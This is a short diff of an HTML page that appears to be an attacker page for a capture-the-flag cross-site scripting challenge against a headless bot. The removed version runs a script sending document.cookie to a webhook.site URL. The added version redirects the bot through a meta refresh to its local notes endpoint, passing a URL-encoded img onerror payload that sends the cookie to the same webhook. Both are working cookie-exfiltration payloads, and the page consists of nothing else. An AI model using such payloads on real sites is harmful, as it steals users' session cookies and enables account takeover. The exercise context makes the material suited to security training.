@@ -1,9 +1,9 @@
 <!doctype html>
 <html>
-  <body>
-    <script>
-      // send the flag cookie back to your webhook
-      fetch("https://webhook.site/513e010b-f256-45cd-9e52-2fbccee01710?cookie=" + encodeURIComponent(document.cookie))
-    </script>
-  </body>
+  <head>
+    <!-- Immediately redirect into the bot’s local notes endpoint with an onerror payload -->
+    <meta http-equiv="refresh" content="0;url=http://127.0.0.1:5000/?note=%3Cimg%20src%3Dx%20onerror%3D%22fetch('https%3A%2F%2Fwebhook.site%2F513e010b-f256-45cd-9e52-2fbccee01710%3Fcookie%3D'%2BencodeURIComponent(document.cookie))%22%3E">
+  </head>
+  <body></body>
 </html>
+
